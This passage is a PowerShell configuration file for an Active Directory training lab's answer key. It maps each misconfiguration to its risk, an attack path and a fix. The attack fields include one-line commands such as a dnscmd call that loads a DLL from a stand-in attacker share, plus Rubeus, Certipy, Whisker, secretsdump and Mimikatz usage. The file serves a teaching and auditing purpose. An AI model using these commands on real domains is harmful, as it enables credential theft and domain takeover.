################################
# AK_SharedConfig.ps1 - Shared configuration, knowledge bases, and helper functions
# Used by all Answer Key sections. Dot-sourced by BadderBloodAnswerKey.ps1.
################################

# ============================================================================
# CONFIGURATION: Define what "clean" looks like
# ============================================================================

$PrivilegedGroups = @(
    "Domain Admins"
    "Enterprise Admins"
    "Schema Admins"
    "Administrators"
    "Account Operators"
    "Backup Operators"
    "Server Operators"
    "Print Operators"
    "DnsAdmins"
    "Group Policy Creator Owners"
)

$Tier0Groups = @(
    "Domain Admins"
    "Enterprise Admins"
    "Schema Admins"
    "Administrators"
)

$LegitimatePrivilegedAccounts = @(
    "Administrator"
    "krbtgt"
)

$AdminOUPatterns = @(
    "*Admin*"
    "*Tier 0*"
    "*Tier 1*"
    "*Tier 2*"
    "*T0-*"
    "*T1-*"
    "*T2-*"
)

# Description patterns that identify BadderBlood-created objects
$BadderBloodDescPatterns = @(
    "*secframe.com/badblood*"
    "*Badblood github.com*"
    "*davidprowe/badblood*"
    "*Created with secframe*"
    "*User Group Created by Badblood*"
    "*Created with BadderBlood*"
    "*Created by BadderBlood*"
    "*Service Account*Created by BadderBlood*"
    "*BadderBlood Corp*"
    "*BadderBlood*"
)

# ============================================================================
# SECURITY KNOWLEDGE BASE - Why each group/setting is dangerous
# ============================================================================

$GroupRiskExplanations = @{
    "Domain Admins" = @{ Risk="FULL DOMAIN COMPROMISE"; Why="Unrestricted access to every domain object. Can DCSync, deploy ransomware via GPO, create Golden Tickets."; Attack="Phish user -> Mimikatz -> DCSync -> Golden Ticket = permanent access."; Principle="DA accounts must be separate, dedicated, used only on Tier 0 systems." }
    "Enterprise Admins" = @{ Risk="FULL FOREST COMPROMISE"; Why="Admin rights across the ENTIRE AD forest. More powerful than DA in multi-domain environments."; Attack="Same as DA, but blast radius extends to every domain in the forest."; Principle="EA should be EMPTY. Add members temporarily for cross-domain tasks only." }
    "Schema Admins" = @{ Risk="IRREVERSIBLE FOREST CHANGES"; Why="Can modify the AD schema - changes are forest-wide and CANNOT be rolled back."; Attack="Attacker corrupts schema -> breaks replication across all DCs."; Principle="Should ALWAYS be empty. Add temporarily only during planned schema extensions." }
    "Administrators" = @{ Risk="LOCAL+DOMAIN ADMIN ON DCs"; Why="Full control over DCs. Can access NTDS.dit (all password hashes) and modify any security settings."; Attack="Log into DC -> dump NTDS.dit -> every password hash in the domain."; Principle="Only DA/EA groups and built-in Administrator account." }
    "Account Operators" = @{ Risk="CAN CREATE/MODIFY ACCOUNTS"; Why="Can create, modify, delete most users/groups. Can reset non-admin passwords and escalate via nested groups. LEGACY group from NT4."; Attack="Reset non-admin passwords -> take over accounts -> create strategic group memberships -> escalate."; Principle="LEGACY group. Should be EMPTY. Use delegated ACLs on OUs instead." }
    "Backup Operators" = @{ Risk="CAN EXTRACT NTDS.DIT"; Why="Can bypass all file permissions to back up NTDS.dit (every password hash) and SYSTEM hive. Effectively equivalent to Domain Admin for credential theft."; Attack="wbadmin to copy NTDS.dit + SYSTEM hive -> secretsdump.py offline -> every domain password."; Principle="Effectively DA-equivalent for credential theft. Should be EMPTY." }
    "Server Operators" = @{ Risk="CAN LOG INTO DCs + MODIFY SERVICES"; Why="Can log into DCs interactively and modify service binary paths to execute arbitrary code as SYSTEM."; Attack="Modify DC service binary path to malicious exe -> service restarts as SYSTEM -> DA equivalent."; Principle="LEGACY group. Should be EMPTY." }
    "Print Operators" = @{ Risk="CAN LOG INTO DCs + LOAD DRIVERS"; Why="Can log into DCs AND load kernel drivers. A malicious driver = SYSTEM access. Despite harmless name, this is a critical escalation path (PrintNightmare)."; Attack="Load malicious printer driver on DC -> runs in kernel mode -> SYSTEM on DC = full domain compromise."; Principle="Should be EMPTY. Never manage printers from DCs." }
    "DnsAdmins" = @{ Risk="REMOTE CODE EXECUTION ON DCs"; Why="Can configure DNS service on DCs to load a custom DLL. DNS runs as SYSTEM, so malicious DLL = SYSTEM on every DC."; Attack="dnscmd /config /serverlevelplugindll \\attacker\mal.dll -> restart DNS -> SYSTEM on DC."; Principle="Effectively DA via DLL injection. Should be EMPTY or dedicated DNS admin only." }
    "Group Policy Creator Owners" = @{ Risk="CAN CREATE GPOs = RCE"; Why="Can create GPOs. A malicious GPO linked to any OU deploys malware/scripts as SYSTEM on all targeted machines within 90 min."; Attack="Create GPO with malicious startup script -> link to server OU -> all machines execute attacker code."; Principle="GPO creation restricted to dedicated admin accounts only." }
}

$SettingRiskExplanations = @{
    "PasswordNotRequired" = @{ Why="PASSWD_NOTREQD flag allows blank password. Anyone can log in with zero effort."; Attack="Enumerate PASSWD_NOTREQD accounts -> blank password login -> instant access."; Principle="Every account must require a password." }
    "PasswordNeverExpires" = @{ Why="If compromised, the password remains valid forever. Attacker has permanent access."; Attack="Obtain hash from breach -> password never expires -> permanent access until manually discovered."; Principle="Passwords should rotate per policy. Service accounts should use gMSAs." }
    "DoesNotRequirePreAuth" = @{ Why="ANYONE on the network (no creds needed!) can request an encrypted ticket and crack it offline at billions of attempts/sec with Hashcat."; Attack="Rubeus/GetNPUsers.py (no creds needed) -> encrypted ticket -> Hashcat offline -> plaintext password."; Principle="Kerberos pre-auth should ALWAYS be required." }
    "TrustedForDelegation" = @{ Why="Caches full TGT of any authenticating user. If a DA connects, their TGT is cached and extractable."; Attack="Compromise account -> Rubeus monitors TGTs -> coerce DA auth via printer bug -> capture DA TGT -> impersonate DA."; Principle="Only DCs should have unconstrained delegation." }
    "TrustedToAuthForDelegation" = @{ Why="Can request service tickets as ANY user (S4U2Self). Can impersonate Domain Admins to delegation targets."; Attack="S4U2Self as DA -> S4U2Proxy to target service -> authenticated as DA."; Principle="Use Resource-Based Constrained Delegation instead." }
    "AllowReversiblePasswordEncryption" = @{ Why="Password stored in recoverable form (essentially plaintext). Anyone with NTDS.dit can recover the actual password."; Attack="Obtain NTDS.dit -> decrypt -> PLAINTEXT password (not hash)."; Principle="Never enable. Exists only for legacy CHAP/DIGEST." }
    "SIDHistory" = @{ Why="Can contain privileged SIDs granting invisible access. Standard group queries won't show it - stealth backdoor."; Attack="Inject DA SID into user's SID History -> silent DA rights -> invisible to Get-ADGroupMember."; Principle="Should be empty unless actively migrating domains." }
    "Kerberoastable" = @{ Why="Any domain user can request a service ticket encrypted with this account's password hash. Offline cracking at billions/sec."; Attack="Any domain user -> GetUserSPNs.py -> ticket -> Hashcat -> plaintext password."; Principle="User accounts should NOT have SPNs. Use gMSAs instead." }
    "AdminCountOrphan" = @{ Why="SDProp set AdminCount=1 and removed ACL inheritance when in a priv group. After removal, AdminCount stays and inheritance stays broken. Delegated permissions don't apply."; Attack="Not directly exploitable but creates blind spots: helpdesk can't reset password, inherited policies don't apply."; Principle="After removing from priv group: clear AdminCount AND re-enable ACL inheritance." }
    "PasswordInDescription" = @{ Why="Plaintext password stored in a readable AD attribute. Any authenticated domain user can query descriptions via LDAP."; Attack="ldapsearch/PowerView -> enumerate descriptions -> instant plaintext credential -> lateral movement."; Principle="Never store credentials in AD attributes. Use a password vault or gMSA." }
    "OUDrift" = @{ Why="User is placed in a department OU that does not match their actual department attribute. This breaks OU-scoped GPOs, delegated permissions, and audit scoping."; Attack="A drifted user may receive wrong GPO settings (e.g., missing security controls) or escape OU-based access reviews."; Principle="User OU placement must match their department. Automate OU placement via HR provisioning." }
}

$NewAttackVectorExplanations = @{
    "RBCD" = @{ Risk="IMPERSONATION VIA DELEGATION"; Why="Resource-Based Constrained Delegation (msDS-AllowedToActOnBehalfOfOtherIdentity) allows the configured principal to impersonate ANY user (including Domain Admins) to the target service."; Attack="Rubeus s4u /impersonateuser:administrator /msdsspn:cifs/target /user:attacker -> service ticket as DA to target."; Principle="Only specific, documented computer accounts should have RBCD configured. Review and remove any unauthorized entries." }
    "ShadowCredentials" = @{ Risk="CREDENTIAL THEFT VIA PKINIT"; Why="WriteProperty on msDS-KeyCredentialLink allows adding a certificate-based credential. The attacker can then authenticate as the target via PKINIT without knowing the password."; Attack="Whisker add /target:victim -> PKINIT auth as victim -> request TGT as victim -> full access."; Principle="WriteProperty on msDS-KeyCredentialLink should only be granted to ADCS enrollment agents and Domain Controllers." }
    "ADCS_ESC1" = @{ Risk="DOMAIN ADMIN VIA CERTIFICATE"; Why="A template with ENROLLEE_SUPPLIES_SUBJECT + Client Authentication EKU allows any enrollee to request a certificate as any user, including Domain Admin."; Attack="Certify find /vulnerable -> certipy req /template:vuln /altname:administrator -> PKINIT as DA."; Principle="Never allow enrollee to supply subject on templates with Client Authentication EKU. Require manager approval." }
    "ADCS_ESC2" = @{ Risk="ANY PURPOSE CERTIFICATE"; Why="A template with the Any Purpose EKU (2.5.29.37.0) or SubCA can be used for client auth, code signing, or any other purpose. Effectively a skeleton key."; Attack="Request cert with Any Purpose EKU -> use for client auth as any user or sign malicious code."; Principle="Templates should have specific, minimal EKUs. Never use Any Purpose or SubCA unless absolutely required." }
    "ADCS_ESC4" = @{ Risk="TEMPLATE TAKEOVER"; Why="WriteProperty or WriteDACL on a certificate template allows an attacker to modify the template to add ENROLLEE_SUPPLIES_SUBJECT or change EKUs, converting it into an ESC1-vulnerable template."; Attack="Modify template -> add CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT + Client Auth EKU -> request cert as DA."; Principle="Certificate template ACLs should only grant write access to CA Admins and Enterprise Admins." }
    "GMSA" = @{ Risk="SERVICE ACCOUNT PASSWORD THEFT"; Why="PrincipalsAllowedToRetrieveManagedPassword controls who can read the gMSA password. If overly broad (Domain Computers, IT groups), any member can retrieve the 240-character password and authenticate as the service account."; Attack="gMSADumper / GMSAPasswordReader -> retrieve managed password -> authenticate as gMSA -> access all resources the gMSA has rights to."; Principle="PrincipalsAllowedToRetrieveManagedPassword should list ONLY the specific computer accounts that run the service. Never use broad groups like Domain Computers." }
    "ADIDNS_ACL" = @{ Risk="DNS RECORD MANIPULATION"; Why="Write access to AD-integrated DNS zones allows creating or modifying DNS records. An attacker can redirect traffic to their machine for credential capture or MITM attacks."; Attack="dnstool.py add wildcard record -> all failed lookups resolve to attacker IP -> Responder captures NTLMv2 hashes domain-wide."; Principle="DNS zone ACLs should only allow Authenticated Users to create records (default), not modify or delete. Remove any non-admin CreateChild/GenericWrite permissions." }
    "ADIDNS_Stale" = @{ Risk="DNS RECORD TAKEOVER"; Why="Stale DNS records pointing to decommissioned servers can be hijacked by an attacker who configures the old IP on their machine, receiving all traffic intended for the defunct service."; Attack="Find stale record -> assign old IP to attacker NIC -> receive auth attempts -> relay credentials."; Principle="Regularly audit DNS for stale records. Remove A records for decommissioned servers. Use DNS scavenging with appropriate aging settings." }
    "LAPSBypass" = @{ Risk="LOCAL ADMIN PASSWORD EXPOSURE"; Why="If non-admin groups can read ms-Mcs-AdmPwd or msLAPS-Password, any member can retrieve every local admin password in scope and pivot to all managed machines."; Attack="Get-ADComputer -Filter * -Properties ms-Mcs-AdmPwd -> plaintext local admin passwords -> PSExec to any managed workstation."; Principle="LAPS password read access must be restricted to dedicated admin groups. Audit with LAPSToolkit or Find-AdmPwdExtendedRights." }
}

$ACLRiskExplanations = @{
    "GenericAll"    = "FULL CONTROL - read/write all properties, reset passwords, modify group membership, delete."
    "GenericWrite"  = "WRITE ALL PROPERTIES - can modify SPNs (Kerberoasting), script paths (code exec), group memberships."
    "WriteDacl"     = "MODIFY PERMISSIONS - can grant themselves any permission, effectively = GenericAll."
    "WriteOwner"    = "CHANGE OWNERSHIP - take ownership -> modify DACL -> grant full control."
    "WriteProperty" = "WRITE PROPERTIES - could modify script paths, SPNs, group membership."
    "ExtendedRight" = "SPECIAL OPS - includes Reset Password, DCSync (Replicating Directory Changes), Unexpire Password."
}

# GPO Risk Database (merged from BadderBloodGPO_AnswerKey.ps1)
$GPORiskDatabase = @{
    "WeakMinLength" = @{ Category = "Weak Password Policy"; Severity = "CRITICAL"; Why = "Short passwords are trivially brute-forced. A 4-character password cracks in seconds with Hashcat."; Attack = "Dump hashes via DCSync/NTDS.dit -> brute-force short passwords -> instant compromise of affected accounts."; Principle = "Minimum 14 characters per Microsoft/NIST guidance. Length > complexity."; Fix = "Set Minimum Password Length to 14+ characters." }
    "NoComplexity" = @{ Category = "Weak Password Policy"; Severity = "HIGH"; Why = "Without complexity, users choose passwords like 'password' or '123456'. Trivially guessable."; Attack = "Password spraying with top-1000 passwords. No complexity = most users pick dictionary words."; Principle = "Enable complexity OR enforce long passphrases (14+). Both together is ideal."; Fix = "Enable Password Complexity Requirements." }
    "NoMaxAge" = @{ Category = "Weak Password Policy"; Severity = "MEDIUM"; Why = "Compromised passwords remain valid forever. No rotation = permanent attacker access."; Attack = "Obtain hash from old breach -> password never expires -> permanent access until manually reset."; Principle = "Max age 90-365 days. Balance security with usability. Use breach detection instead of frequent rotation."; Fix = "Set Maximum Password Age to 90-365 days." }
    "NoLockout" = @{ Category = "Weak Password Policy"; Severity = "HIGH"; Why = "No account lockout allows unlimited brute-force attempts against accounts."; Attack = "Spray passwords forever with no lockout risk. Eventually crack weak passwords."; Principle = "Lock after 5-10 failed attempts. 15-30 min lockout duration."; Fix = "Set Account Lockout Threshold to 5-10 attempts." }
    "NoHistory" = @{ Category = "Weak Password Policy"; Severity = "MEDIUM"; Why = "Users can immediately reuse their old password when forced to change. Password rotation becomes meaningless."; Attack = "If password is compromised and changed, user can change it right back -> attacker retains access."; Principle = "Remember at least 24 passwords to prevent reuse."; Fix = "Set Enforce Password History to 24." }
    "FirewallDisabled" = @{ Category = "Disabled Security Control"; Severity = "CRITICAL"; Why = "No host-based firewall = any service is exposed. Worms and lateral movement tools have unrestricted network access."; Attack = "WannaCry-style worm -> no firewall -> spreads to every machine instantly. EternalBlue, PetitPotam, etc."; Principle = "Enable on ALL profiles. Use firewall rules for specific exceptions, never disable entirely."; Fix = "Enable Windows Firewall on Domain, Private, and Public profiles." }
    "UACDisabled" = @{ Category = "Disabled Security Control"; Severity = "HIGH"; Why = "UAC is the last barrier preventing malware running as a standard user from escalating to admin. Without it, any process inherits full admin rights."; Attack = "Phishing -> malware runs -> no UAC prompt -> instant admin -> game over."; Principle = "EnableLUA=1, ConsentPromptBehaviorAdmin=2 (consent for non-Windows binaries), FilterAdministratorToken=1."; Fix = "Re-enable UAC: EnableLUA=1, ConsentPromptBehaviorAdmin=2, FilterAdministratorToken=1." }
    "DefenderDisabled" = @{ Category = "Disabled Security Control"; Severity = "CRITICAL"; Why = "Disabling AV via GPO ensures post-exploitation tools run without being quarantined. A well-known attacker technique."; Attack = "Disable Defender via GPO -> deploy Mimikatz, Cobalt Strike beacons -> no quarantine."; Principle = "Never disable Defender via GPO. If third-party AV, verify it is active first."; Fix = "Set DisableAntiSpyware=0, DisableRealtimeMonitoring=0, DisableBehaviorMonitoring=0." }
    "WDigestEnabled" = @{ Category = "Credential Exposure"; Severity = "CRITICAL"; Why = "WDigest stores cleartext passwords in LSASS memory. Mimikatz sekurlsa::wdigest dumps plaintext for every logged-on user."; Attack = "Any code execution -> sekurlsa::wdigest -> plaintext passwords for all interactive sessions."; Principle = "UseLogonCredential=0. Migrate apps off WDigest/HTTP Digest authentication."; Fix = "Set UseLogonCredential=0." }
    "SMBSigningDisabled" = @{ Category = "Lateral Movement"; Severity = "CRITICAL"; Why = "Without SMB signing, NTLM relay attacks can relay captured credentials to authenticate to other machines."; Attack = "Responder + ntlmrelayx -> capture hash on one machine -> relay to another -> unauthenticated lateral movement."; Principle = "RequireSecuritySignature=1 on both LanmanServer and LanManWorkstation."; Fix = "Set RequireSecuritySignature=1 on both server and client." }
    "LLMNREnabled" = @{ Category = "Lateral Movement"; Severity = "HIGH"; Why = "LLMNR responds to broadcast name queries. Responder/Inveigh poison these to capture NTLMv2 hashes."; Attack = "Responder -> poison LLMNR -> capture NTLMv2 hashes from typos and disconnected shares."; Principle = "EnableMulticast=0. Use DNS exclusively for name resolution."; Fix = "Set EnableMulticast=0." }
    "NTLMv1Allowed" = @{ Category = "Credential Exposure"; Severity = "CRITICAL"; Why = "LM hashes are split into two 7-character chunks and crackable in seconds. NTLMv1 is vulnerable to pass-the-hash."; Attack = "Capture LM/NTLMv1 hash -> crack in seconds -> plaintext password."; Principle = "LmCompatibilityLevel=5 (send NTLMv2 only, refuse LM and NTLM)."; Fix = "Set LmCompatibilityLevel=5." }
    "PSLoggingDisabled" = @{ Category = "Audit Evasion"; Severity = "HIGH"; Why = "PowerShell is the primary post-exploitation framework. Without logging, attackers run payloads with no forensic trace."; Attack = "Encoded/obfuscated payloads, download-cradles, Mimikatz -> no event log evidence."; Principle = "Enable ScriptBlockLogging, ModuleLogging (modules: *), and Transcription."; Fix = "Set EnableScriptBlockLogging=1, EnableModuleLogging=1, EnableTranscripting=1." }
    "ExcessiveCachedCreds" = @{ Category = "Credential Exposure"; Severity = "MEDIUM"; Why = "Cached domain credentials stored as MSCACHEv2 hashes on disk. Offline cracking reveals domain passwords."; Attack = "Extract HKLM\\SECURITY -> hashcat MSCACHEv2 -> plaintext domain passwords."; Principle = "CachedLogonsCount=1 or 2 maximum."; Fix = "Set CachedLogonsCount=2." }
    "RDPNoNLA" = @{ Category = "Lateral Movement"; Severity = "HIGH"; Why = "Without NLA, the login screen is presented before authentication, enabling brute-force and MITM attacks."; Attack = "Credential spraying, BlueKeep exploitation, session MITM all easier without NLA."; Principle = "UserAuthentication=1, MinEncryptionLevel=3. Restrict RDP to admin VLANs."; Fix = "Set UserAuthentication=1, MinEncryptionLevel=3." }
    "AutoRunEnabled" = @{ Category = "Disabled Security Control"; Severity = "MEDIUM"; Why = "AutoRun executes autorun.inf automatically on USB/CD insertion. USB-based malware achieves code execution with no user interaction."; Attack = "BadUSB/rubber ducky -> AutoRun executes payload on insertion -> instant code execution."; Principle = "NoDriveTypeAutoRun=255 (disable all). NoAutoplayfornonVolume=1."; Fix = "Set NoDriveTypeAutoRun=255." }
    "LSAProtectionDisabled" = @{ Category = "Credential Exposure"; Severity = "HIGH"; Why = "RunAsPPL makes LSASS a Protected Process Light, preventing Mimikatz from reading its memory."; Attack = "Without RunAsPPL -> sekurlsa::logonpasswords works on any session -> credential theft."; Principle = "RunAsPPL=1, EnableVirtualizationBasedSecurity=1 for Credential Guard."; Fix = "Set RunAsPPL=1, EnableVirtualizationBasedSecurity=1." }
    "AnonymousEnumeration" = @{ Category = "Information Disclosure"; Severity = "HIGH"; Why = "Null sessions allow unauthenticated enumeration of all domain users, groups, and shares via IPC$."; Attack = "enum4linux/rpcclient -> full user list without credentials -> password spraying targets."; Principle = "RestrictAnonymousSAM=1, RestrictAnonymous=1, RestrictNullSessAccess=1."; Fix = "Set RestrictAnonymousSAM=1, RestrictAnonymous=1, RestrictNullSessAccess=1." }
    "WinRMInsecure" = @{ Category = "Credential Exposure"; Severity = "HIGH"; Why = "WinRM Basic auth encodes credentials as Base64 (not encrypted). Network observer reads plaintext domain credentials."; Attack = "Capture port 5985 traffic -> Base64 decode -> plaintext domain credentials."; Principle = "AllowUnencryptedTraffic=0, AllowBasic=0. Use Kerberos or CredSSP over HTTPS."; Fix = "Set AllowUnencryptedTraffic=0, AllowBasic=0 on both Service and Client." }
    "TinyEventLogs" = @{ Category = "Audit Evasion"; Severity = "HIGH"; Why = "Tiny event logs fill in minutes, overwriting evidence of logon events, privilege use, and process creation."; Attack = "Set tiny logs -> attacker actions overwritten before IR teams arrive -> evidence destruction."; Principle = "Security log >= 1GB. System/PS >= 256MB. Retention = Archive. Forward to SIEM."; Fix = "Set Security MaxSize=1048576, System/PS MaxSize=262144." }
    "LDAPSigningDisabled" = @{ Category = "Lateral Movement"; Severity = "HIGH"; Why = "Without LDAP signing, LDAP traffic can be intercepted and modified in transit (MITM)."; Attack = "ldap_relay/ntlmrelayx -> relay auth to DC via LDAP -> create admin accounts or modify ACLs."; Principle = "LDAPServerIntegrity=2 (Require). LDAPClientIntegrity=1 (Negotiate)."; Fix = "Set LDAPServerIntegrity=2, LDAPClientIntegrity=1." }
    "GPPPassword" = @{ Category = "Credential Exposure"; Severity = "CRITICAL"; Why = "Microsoft published the AES key for GPP cpasswords (KB2962486). Any domain user can decrypt in 5 seconds."; Attack = "Any domain user -> read SYSVOL -> gpp-decrypt/Get-GPPPassword -> plaintext password."; Principle = "Delete Groups.xml. Use LAPS for local admin passwords. Never store passwords in GPP."; Fix = "Delete the Groups.xml file from SYSVOL." }
    "GPODelegation" = @{ Category = "GPO Permissions"; Severity = "HIGH"; Why = "GPO edit access = remote code execution on every machine the GPO applies to within 90 minutes."; Attack = "Edit GPO -> add malicious startup script -> all targeted machines execute attacker code."; Principle = "Only Domain Admins and Group Policy Creator Owners should edit GPOs."; Fix = "Remove edit permissions from non-admin principals." }
    "ScheduledTaskGPO" = @{ Category = "Persistence"; Severity = "CRITICAL"; Why = "A SYSTEM-privileged scheduled task from a writable network share is a perfect lateral movement primitive."; Attack = "Write to share -> replace script -> SYSTEM execution on every machine at next boot."; Principle = "Verify share ACLs grant ONLY IT admins write access. Consider code signing."; Fix = "Lock down share ACLs. Remove Domain Users write from NTFS." }
    "LAPSGPOMisconfigured" = @{ Category = "LAPS Bypass"; Severity = "CRITICAL"; Why = "If LAPS password length is short or age is long, local admin passwords are weak or unchanged for extended periods."; Attack = "Short LAPS password -> brute-forceable. Long age -> stale password known to former admins."; Principle = "LAPS password length >= 20 characters. Max age <= 30 days."; Fix = "Set AdmPwdLength >= 20, MaxAge <= 30." }
}

# Category-level explanations for cheat sheet headers
$CategoryExplanations = @{
    "Privileged Group Membership" = @(
        "WHY THIS MATTERS: Users in privileged groups have elevated domain permissions."
        "BadderBlood randomly placed users into admin groups they should never be in."
        "Each group has specific dangers - see individual findings below."
    )
    "Kerberos Security" = @(
        "WHY THIS MATTERS: These settings allow offline password cracking attacks."
        "AS-REP Roasting (DoesNotRequirePreAuth): ANYONE can request an encrypted ticket"
        "  and crack it offline - NO credentials needed to start the attack."
        "Kerberoasting (SPNs on users): Any domain user can request a service ticket"
        "  and crack the user's password offline at billions of attempts per second."
    )
    "Account Settings" = @(
        "WHY THIS MATTERS: Dangerous flags on user accounts that weaken security."
        "Includes: blank passwords allowed, passwords that never expire,"
        "reversible encryption (plaintext equivalent), and stale AdminCount flags."
    )
    "Dangerous ACL" = @(
        "WHY THIS MATTERS: BadderBlood granted random users/groups permissions on critical"
        "AD objects. These ACLs let non-admins modify objects they shouldn't touch."
        "Permissions on AdminSDHolder are especially dangerous - they get copied to"
        "ALL protected accounts every 60 minutes by the SDProp process."
    )
    "Delegation" = @(
        "WHY THIS MATTERS: Delegation settings allow credential theft and impersonation."
        "Unconstrained delegation caches full TGTs - if an admin authenticates,"
        "their ticket can be stolen. Only DCs should have unconstrained delegation."
    )
    "OU Misplacement" = @(
        "WHY THIS MATTERS: Users are in the wrong OUs, violating the tiered admin model."
        "'Shadow Admins' = regular employees with secret admin rights (easy phishing targets)."
        "'Misplaced accounts' = accounts in admin OUs with no actual admin rights."
    )
    "Nested Group Membership" = @(
        "WHY THIS MATTERS: Groups nested inside privileged groups silently grant all"
        "members inherited privileges. Common backdoor technique - less visible than"
        "direct membership. Use Get-ADGroupMember -Recursive to catch these."
    )
    "SID History" = @(
        "WHY THIS MATTERS: SID History can contain privileged SIDs that grant hidden"
        "access invisible to standard group membership queries."
    )
    "GPO Permissions" = @(
        "WHY THIS MATTERS: GPO edit access = remote code execution on all machines"
        "the GPO applies to. An attacker can deploy malware domain-wide within 90 min."
    )
    "GPO Settings" = @(
        "WHY THIS MATTERS: Insecure GPO settings disable host defenses (firewall, AV, UAC),"
        "expose credentials (WDigest, GPP passwords, LAPS ACL), enable lateral movement"
        "(SMB relay, LLMNR poisoning), and destroy forensic evidence (tiny event logs)."
        "These are domain-wide policy misconfigurations that affect every machine the GPO applies to."
    )
    "Credential Exposure" = @(
        "WHY THIS MATTERS: Plaintext passwords stored in AD attributes (like Description)"
        "are readable by ANY authenticated domain user via LDAP queries."
        "This is equivalent to posting passwords on a bulletin board."
    )
    "OU Drift" = @(
        "WHY THIS MATTERS: Users placed in the wrong department OU will receive incorrect"
        "GPO settings, escape department-scoped access reviews, and break delegated admin"
        "permissions. Simulates real-world HR transfer/provisioning failures."
    )
    "Computer Group Membership" = @(
        "WHY THIS MATTERS: Computer accounts in security groups can inherit permissions and"
        "receive GPOs scoped to those groups. BadderBlood randomly adds ~15% of computers to"
        "non-critical groups to simulate misconfigured environment drift."
        "An attacker who compromises a computer account (e.g., via NTLM relay) can inherit"
        "any resource access granted to those groups."
    )
    "Resource-Based Constrained Delegation" = @(
        "WHY THIS MATTERS: RBCD (msDS-AllowedToActOnBehalfOfOtherIdentity) allows the"
        "configured principal to impersonate ANY domain user (including Domain Admins) to"
        "the target service. Exploitable via Rubeus S4U attacks."
        "Any principal with write access to a computer's msDS-AllowedToActOnBehalfOfOtherIdentity"
        "can configure RBCD and then impersonate privileged users to that computer."
    )
    "Shadow Credentials" = @(
        "WHY THIS MATTERS: WriteProperty on msDS-KeyCredentialLink allows adding a"
        "certificate-based credential to a user or computer account. The attacker can"
        "then authenticate as that account via PKINIT without knowing the password."
        "Exploitable via Whisker, pyWhisker, or Certipy."
    )
    "ADCS Misconfiguration" = @(
        "WHY THIS MATTERS: Misconfigured certificate templates (ESC1-ESC8) are the #1"
        "real-world AD attack path. A vulnerable template can allow any domain user to"
        "request a certificate as Domain Admin and authenticate with it."
        "Tools: Certify, Certipy, ForgeCert. Detection: PSPKIAudit, Certutil."
    )
    "gMSA Misconfiguration" = @(
        "WHY THIS MATTERS: Group Managed Service Accounts have 240-character auto-rotated"
        "passwords, but PrincipalsAllowedToRetrieveManagedPassword controls who can read them."
        "If overly broad (Domain Computers, large groups), any member can retrieve the password"
        "and authenticate as the gMSA. Tools: gMSADumper, GMSAPasswordReader."
    )
    "ADIDNS Misconfiguration" = @(
        "WHY THIS MATTERS: AD-integrated DNS zones are stored in Active Directory."
        "Write access to DNS zones allows creating wildcard records that redirect all"
        "failed lookups to an attacker IP for credential capture. Stale records for"
        "decommissioned servers can be hijacked for MITM attacks."
    )
    "LAPS Bypass" = @(
        "WHY THIS MATTERS: LAPS stores unique local admin passwords on each computer's"
        "AD object. If non-admin groups can read ms-Mcs-AdmPwd or msLAPS-Password,"
        "they can retrieve every local admin password and pivot to all managed machines."
        "Tools: LAPSToolkit, crackmapexec, Get-LAPSPasswords."
    )
    "Weak Password Policy" = @(
        "WHY THIS MATTERS: GPO-deployed password policies override domain defaults."
        "A GPO with weak settings (short length, no complexity, no lockout) applied"
        "at domain level effectively nullifies the domain password policy."
    )
    "Disabled Security Control" = @(
        "WHY THIS MATTERS: GPOs that disable security controls (firewall, UAC, Defender)"
        "affect every machine they apply to. Attackers use this technique to suppress"
        "host defenses before deploying post-exploitation tools."
    )
    "Audit Evasion" = @(
        "WHY THIS MATTERS: Disabling PowerShell logging and shrinking event logs"
        "eliminates forensic evidence. Attackers won't leave traces of their activity"
        "if the logs are disabled or overwritten within minutes."
    )
    "Lateral Movement" = @(
        "WHY THIS MATTERS: Settings like disabled SMB signing, LLMNR enabled, and"
        "disabled LDAP signing enable network-level attacks (NTLM relay, poisoning)"
        "that allow unauthenticated lateral movement across the domain."
    )
    "Information Disclosure" = @(
        "WHY THIS MATTERS: Anonymous enumeration allows unauthenticated attackers to"
        "harvest the full list of domain users and groups via null sessions."
    )
    "Persistence" = @(
        "WHY THIS MATTERS: GPO-deployed scheduled tasks running as SYSTEM from writable"
        "shares give attackers persistent, privileged code execution domain-wide."
    )
}

# Legitimate GPO editors (not flagged as suspicious)
$LegitGPOEditors = @("Domain Admins","Enterprise Admins","ENTERPRISE DOMAIN CONTROLLERS","SYSTEM","Authenticated Users","Administrator")

# Known insecure GPO names created by Invoke-BadderBloodGPO.ps1
$KnownBadGPONames = @(
    "IT-PasswordPolicy-Standard"
    "NET-Firewall-Exceptions"
    "APP-Compatibility-UAC"
    "SEC-Authentication-Legacy"
    "NET-SMBPerformance-Tuning"
    "NET-NameResolution-Compat"
    "SEC-NTLM-Compatibility"
    "APP-Antivirus-Exclusions"
    "IT-PowerShell-Config"
    "IT-OfflineLogon-Policy"
    "IT-RemoteAccess-Standard"
    "IT-MediaPolicy-Standard"
    "SEC-CredentialProtection-Config"
    "NET-AnonymousAccess-Legacy"
    "IT-WinRM-Management"
    "IT-EventLog-Retention"
    "IT-LocalAdmin-Deploy"
    "NET-LDAP-Compatibility"
    "SEC-LAPS-Deployment"
    "IT-Maintenance-Tasks"
    "SEC-EmergencyAccess-Override"
    "IT-AdminBackdoor-Cleanup"
    "YOURORGANIZATION-TempPolicy-DELETE"
)

# ============================================================================
# HELPER FUNCTIONS
# ============================================================================

function Write-Status {
    param([string]$Message, [string]$Color = "Cyan")
    if (-not $Quiet) {
        Write-Host "[*] $Message" -ForegroundColor $Color
    }
}

function Get-UserDepartment {
    param([string]$CanonicalName)
    if ($CanonicalName -match '/People/([^/]+)/') { return $Matches[1] }
    elseif ($CanonicalName -match '/Stage/([^/]+)/') { return "Stage/$($Matches[1])" }
    elseif ($CanonicalName -match '/Admin/') { return "Admin" }
    return "Unknown"
}

function Get-FriendlyOUPath {
    param([string]$CanonicalName)
    if ($CanonicalName) {
        $parts = $CanonicalName -split '/'
        if ($parts.Count -ge 3) { return ($parts[1..($parts.Count - 2)] -join ' > ') }
    }
    return "Root"
}

function Write-Finding {
    param(
        [string]$Category,
        [string]$Severity,
        [string]$Finding,
        [string]$CurrentState,
        [string]$ExpectedState,
        [string]$WhyBad = "",
        [string]$AttackScenario = "",
        [string]$UserContext = "",
        [string]$Principle = "",
        [string]$ObjectDN = "",
        [string]$GPOName = "",
        [string]$GPOGUID = ""
    )
    [PSCustomObject]@{
        Category       = $Category
        Severity       = $Severity
        Finding        = $Finding
        CurrentState   = $CurrentState
        ExpectedState  = $ExpectedState
